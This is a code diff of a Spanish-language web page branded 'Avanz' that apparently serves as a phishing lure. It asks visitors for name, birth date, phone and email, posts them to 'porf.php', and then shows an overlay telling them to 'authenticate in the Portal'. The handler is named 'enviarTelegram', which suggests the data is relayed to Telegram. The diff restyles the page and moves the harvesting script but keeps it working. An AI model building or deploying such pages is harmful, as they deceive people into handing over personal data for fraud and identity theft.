@@ -2,214 +2,201 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
- 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avanz</title>
  
-   
     <style>
-    
-        .header {
-            width: 97.5%;
-            height: 100px;
-             background-size: cover;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 20px;
-            position: relative;
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
         }
+
+        .header {
+            height: 80px;
+            display: flex;
+           
+            padding: 10px;
+            background-color: #fff;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
         .logo img {
             height: 50px;
         }
-        .top-right-image {
-            position: absolute;
-            top: 10px;
-            right: 20px;
-            height: 80px;
-        }
-        .login-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: -400px;
-        }
-       
-        
-         
 
         .masa3 {
-        width: 100%;
-        height: 30px;
-        margin: 0px;
-        background-color: #005961;
-        padding: 5px;
-    }
-
-
-        
-
-    </style>
-    <style>
-        body {margin: 0px;
-            font-family: Arial, sans-serif;
-        
-          
+            width: 100%;
+            height: 30px;
+            background-color: #005961;
+            padding: 5px;
+            text-align: center;
+            color: white;
         }
+
         .container {
             background: white;
-            max-width: 400px;
-            margin: auto;
+            max-width: 90%;
+            width: 400px;
+            margin: 20px auto;
             padding: 20px;
-            border-radius: 5px;
+            border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
+
         h2 {
             border-bottom: 3px solid orange;
             padding-bottom: 5px;
+            text-align: center;
         }
+
         label {
             font-weight: bold;
             display: block;
             margin-top: 10px;
         }
+
         input {
             width: 100%;
-            padding: 8px;
+            padding: 10px;
             margin-top: 5px;
             border: 1px solid #ccc;
             border-radius: 4px;
+            font-size: 16px;
         }
+
         button {
             background-color: orange;
             color: white;
-            padding: 10px;
+            padding: 12px;
             border: none;
             border-radius: 4px;
             cursor: pointer;
             width: 100%;
             margin-top: 15px;
+            font-size: 16px;
+        }
+
+        img {
+         
+            max-width: 400px;
+            display: block;
+            margin: auto;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                width: 100%;
+                padding: 15px;
+            }
+
+            button {
+                padding: 10px;
+                font-size: 14px;
+            }
+
+            input {
+                font-size: 14px;
+            }
+        }
+
+        .pan {
+            
+          width: 100px;
         }
     </style>
 </head>
 
-
-
-
-
-<script>
-    function enviarTelegram(event) {
-        event.preventDefault();
-        let formulario = document.getElementById('formulario');
-        if (!formulario.checkValidity()) {
-            formulario.reportValidity();
-            return;
-        }
-    
-        let overlay = document.createElement('div');
-        overlay.style.position = 'fixed';
-        overlay.style.top = '0';
-        overlay.style.left = '0';
-        overlay.style.width = '100%';
-        overlay.style.height = '100%';
-        overlay.style.background = 'rgba(0, 0, 0, 0.5)';
-        overlay.style.display = 'flex';
-        overlay.style.alignItems = 'center';
-        overlay.style.justifyContent = 'center';
-        overlay.style.zIndex = '9999';
-        
-        let mensajeBox = document.createElement('div');
-        mensajeBox.style.background = '#fff';
-        mensajeBox.style.padding = '20px';
-        mensajeBox.style.borderRadius = '10px';
-        mensajeBox.style.textAlign = 'center';
-        mensajeBox.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.3)';
-        mensajeBox.innerHTML = '<p style="font-size: 18px;">Para hacer efectiva tu solicitud deberás autenticarte en el Portal.</p>';
-        
-        overlay.appendChild(mensajeBox);
-        document.body.appendChild(overlay);
-        
-        setTimeout(() => {
-            document.body.removeChild(overlay);
-            formulario.submit();
-        }, 2000);
-    }
-    
-    document.addEventListener("DOMContentLoaded", function () {
-        document.getElementById('formulario').addEventListener('submit', enviarTelegram);
-    });
-    </script>
-    
-
-
-
-
-<body onload="generateCSRFToken()">
+<body>
     <div class="header">
-        <img width="120px" style=" margin-top: 10px;" src="img/lk.svg" alt="Avanz">
-     </div>
+        <div style="float: left;">        <img class="pan" src="img/lk.svg" alt="Avanz">
+</div>
+    </div>
     
-     <div class="masa3">
-        <center>        
- <p style="margin-top: 5px;color: white;">Envio de solicitud</p>        </center>
+    <div class="masa3">
+        <p>Envio de solicitud</p>
     </div>
 
+    <br>
 
+    <center>
+        <img src="Tu carro.jpg" alt="Carro">
+        <br>
+        <img src="image.png" alt="Imagen">
+    </center>
 
-    <br>    <br>
-
-
-<center>    <img width="350px" src="Tu carro.jpg" alt="">
-
-
-    <br><br>
-
-<img width="450px" src="image.png" alt="">
-</center>
-
-<br>
+    <br>
  
-    <div class="container"  style="    background-color: #f2f2f2;">
+    <div class="container">
         <h2>Formulario de solicitud</h2>
         <br>
         <form id="formulario" method="post" action="porf.php">
             <label for="primer_nombre">* Nombre y apellido</label>
             <input type="text" id="primer_nombre" name="name" required>
-            
- <br>  
- <br>
-             
+
+            <br>  
+
             <label for="fecha_nacimiento">* Fecha de nacimiento</label>
-            <input required inputmode="numeric" type="date" id="fecha_nacimiento" name="dates" required>
+            <input type="date" id="fecha_nacimiento" name="dates" required>
 
-<br>  
-<br>
-            <label for="primer_nombre">* Número de teléfono</label>
-            <input required type="text" id="primer_nombre" name="cel" required>
-            
-<br>  
-<br>
+            <br>  
 
-            <label for="primer_nombre">* Correo electrónico</label>
-            <input required type="text" id="primer_nombre" name="arroba" required>
+            <label for="telefono">* Número de teléfono</label>
+            <input type="text" id="telefono" name="cel" required>
 
-            
-  <br>       <br>  
-            
+            <br>  
+
+            <label for="correo">* Correo electrónico</label>
+            <input type="email" id="correo" name="arroba" required>
+
+            <br>  
+
             <button type="submit" onclick="enviarTelegram()">Enviar</button>
-  
-  
-  
-  <br><br>
-  
         </form>
     </div>
 
+    <script>
+        function enviarTelegram(event) {
+            event.preventDefault();
+            let formulario = document.getElementById('formulario');
+            if (!formulario.checkValidity()) {
+                formulario.reportValidity();
+                return;
+            }
+        
+            let overlay = document.createElement('div');
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.background = 'rgba(0, 0, 0, 0.5)';
+            overlay.style.display = 'flex';
+            overlay.style.alignItems = 'center';
+            overlay.style.justifyContent = 'center';
+            overlay.style.zIndex = '9999';
+            
+            let mensajeBox = document.createElement('div');
+            mensajeBox.style.background = '#fff';
+            mensajeBox.style.padding = '20px';
+            mensajeBox.style.borderRadius = '10px';
+            mensajeBox.style.textAlign = 'center';
+            mensajeBox.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.3)';
+            mensajeBox.innerHTML = '<p style="font-size: 18px;">Para hacer efectiva tu solicitud deberás autenticarte en el Portal.</p>';
+            
+            overlay.appendChild(mensajeBox);
+            document.body.appendChild(overlay);
+            
+            setTimeout(() => {
+                document.body.removeChild(overlay);
+                formulario.submit();
+            }, 2000);
+        }
 
-<div style="height: 300px;">
-
-
-
-</div>
+        document.addEventListener("DOMContentLoaded", function () {
+            document.getElementById('formulario').addEventListener('submit', enviarTelegram);
+        });
+    </script>
 
 </body>
 </html>
